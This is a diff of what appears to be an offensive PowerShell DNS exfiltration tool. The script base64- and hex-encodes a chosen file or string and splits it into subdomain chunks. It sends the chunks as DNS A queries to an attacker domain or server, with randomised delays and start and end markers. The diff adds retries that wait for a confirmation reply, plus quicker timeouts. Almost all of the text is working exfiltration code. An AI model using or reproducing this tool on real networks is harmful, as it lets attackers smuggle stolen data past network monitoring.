@@ -16,7 +16,6 @@ $Server=$args[7]
 $TcpOnly=$args[9]
 $DelayMin=$args[11]
 $DelayMax=$args[13]
-$Random=$args[14] 
 
 # Banner
 function Show-Banner {
@@ -61,14 +60,14 @@ if ($args[5] -lt 4) { Show-Banner ; Show-Help ; Write-Host "[!] Domain length is
 if ($args[5] -gt 240) { Show-Banner ; Show-Help ; Write-Host "[!] Domain length is too long!" -ForegroundColor Red ; Write-Host ; break }
 
 # Filters
-filter thx { ($_.ToCharArray() | % { "{0:X2}" -f [int]$_ }) -join "" }
+filter thx { (($_.ToCharArray() | % { "{0:X2}" -f [int]$_ }) -join "").tolower() }
 filter chunks($c) { $t = $_; 0..[math]::floor($t.length / $c) | % { $t.substring($c * $_, [math]::min($c, $t.length - $c * $_)) }} 
-filter dots($c) { ($_ -replace "([\w]{$c})", "`$1.").trim('.') } ; $SubdomainLength = 32 ; $Base=0 ; $script:base = $Base
+filter dots($c) { ($_ -replace "([\w]{$c})", "`$1.").trim(".") } ; $SubdomainLength = 32 ; $Base=0 ; $global:base = $Base
 
 # Data Input 
-if ($Payload -like "*:\*") { $b64Payload = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Payload)) }
-else { $b64Payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Payload)) } 
-$Extension = $Payload.Split('.')[1] ; $Payload = $b64Payload
+if (($Payload -like "*:\*") -or ($Payload -like ".\*")) { $b64Payload = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Payload)) }
+else { $b64Payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Payload)) } ; $Payload = $b64Payload
+if ("." -in $Payload.Split) { $Extension = $Payload.Split(".")[-1] } else { $Extension = "txt" }
 
 # Display Info
 function Show-Info {
@@ -89,7 +88,7 @@ Write-Host "[i] Sending $Bytes $ByteSize in $Chunks chunks over $Protocol on $Da
 
 # Transmission Time
 if ($DelayMax -eq 0) { if ($DelayMin -ne 0) { $Time = ($Chunks -2) * ($DelayMin / 1000) } else {
-if ($DelayMin -eq 0) { $DelayMin = 0.1 ; $Time = ($Chunks -2) * ($DelayMin) }} ; $Seconds = 'sec'
+if ($DelayMin -eq 0) { $DelayMin = 0.01 ; $Time = ($Chunks -2) * ($DelayMin) }} ; $Seconds = 'sec'
 if ($Time -ge 60) { $Time = $Time / 60 ; $Seconds = 'min'} ; if ($Time -ge 60) { $Time = $Time / 60 ; $Seconds = 'h'}
 if ($Seconds -eq 'h') { if ($Time -ge 24) { $Time = $Time / 24 ; $Seconds = 'd'}} ; $Time = [math]::Round($Time,1)
 Write-Host "[i] Estimated transmission time is $Time $Seconds in best conditions" -ForegroundColor Blue }
@@ -107,23 +106,30 @@ $RandTarget1 = (-join (( 0x66..0x7A) | Get-Random -Count $(Get-Random (2..3))  |
 $RandTarget2 = (-join (( 0x66..0x7A) | Get-Random -Count $(Get-Random (4..5))  | % {[char]$_}))
 $RandTarget3 = (-join (( 0x66..0x7A) | Get-Random -Count $(Get-Random (2..3))  | % {[char]$_})) ; if ($Random) {
 
-if (!$Server) { if ($TcpOnly -in 'True') { Resolve-DnsName -TcpOnly -type A -DnsOnly "$((++$script:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }
-else { Resolve-DnsName -type A -DnsOnly "$((++$script:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }}
-else { if ($TcpOnly -in 'True') { Resolve-DnsName -TcpOnly -Server $Server -type A -DnsOnly "$((++$script:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }
-else { Resolve-DnsName -Server $Server -type A -DnsOnly "$((++$script:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }}}
+if (!$Server) { if ($TcpOnly -in 'True') { $DnsQuery = Resolve-DnsName -TcpOnly -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }
+else { $DnsQuery = Resolve-DnsName -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }}
+else { if ($TcpOnly -in 'True') { $DnsQuery = Resolve-DnsName -TcpOnly -Server $Server -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }
+else { $DnsQuery = Resolve-DnsName -Server $Server -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }}}
 
-else { if (!$Server) { if ($TcpOnly -in 'True') { Resolve-DnsName -TcpOnly -type A -DnsOnly "$((++$script:base)).$domain.$($Target|Get-Random)" | Select -First 1 }
-else { Resolve-DnsName -type A -DnsOnly "$((++$script:base)).$domain.$($Target|Get-Random)" | Select -First 1 }}
-else { if ($TcpOnly -in 'True') { Resolve-DnsName -TcpOnly -Server $Server -type A -DnsOnly "$((++$script:base)).$domain.$($Target|Get-Random)" | Select -First 1 }
-else { Resolve-DnsName -Server $Server -type A -DnsOnly "$((++$script:base)).$domain.$($Target|Get-Random)" | Select -First 1 }}}}
+else { if (!$Server) { if ($TcpOnly -in 'True') { $DnsQuery = Resolve-DnsName -TcpOnly -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$($Target|Get-Random)" ; $DnsQuery | Select -First 1 }
+else { $DnsQuery = Resolve-DnsName -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$($Target|Get-Random)" ; $DnsQuery | Select -First 1 }}
+else { if ($TcpOnly -in 'True') { $DnsQuery = Resolve-DnsName -TcpOnly -Server $Server -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$($Target|Get-Random)" ; $DnsQuery | Select -First 1 }
+else { $DnsQuery = Resolve-DnsName -Server $Server -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$($Target|Get-Random)" ; $DnsQuery | Select -First 1 }}}
+if ($DnsQuery.IPAddress -ne "0.0.0.0") { --$global:base }}
 
 # Main Function
-Show-Banner ; Show-Info 
-if ($extension) { DnsQuery "$extension.start" } else { DnsQuery "start" }
-$Payload | out-string | thx | chunks $DomainLength | dots $SubdomainLength | % { if ($DelayMin -lt $DelayMax) { 
-Start-Sleep -Milliseconds (Get-Random -Minimum $DelayMin -Maximum $DelayMax) } else { if ($DelayMin -gt 0) {
-Start-Sleep -Milliseconds $DelayMin }} DnsQuery $_ }
-if ($extension) { DnsQuery "$extension.end" } else { DnsQuery "end" }
+Show-Banner ; Show-Info
+if ($args -like "-random") { $Random = "True" } 
+if ($extension) { do { $DnsQuery = DnsQuery "$extension.start" ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
+else { do { $DnsQuery = DnsQuery "start" ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
+
+$Payload | out-string | thx | chunks $DomainLength | dots $SubdomainLength | % {
+if ($DelayMin -lt $DelayMax) { Start-Sleep -Milliseconds (Get-Random -Minimum $DelayMin -Maximum $DelayMax) }
+else { if ($DelayMin -gt 0) { Start-Sleep -Milliseconds $DelayMin }}
+do { $DnsQuery = DnsQuery $_ ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
+
+if ($extension) { do { $DnsQuery = DnsQuery "$extension.end" ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
+else { do { $DnsQuery = DnsQuery "end" ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
 Write-Host ; Write-Host "[+] Done!" -NoNewLine -ForegroundColor Green }
 
 # Decode Function
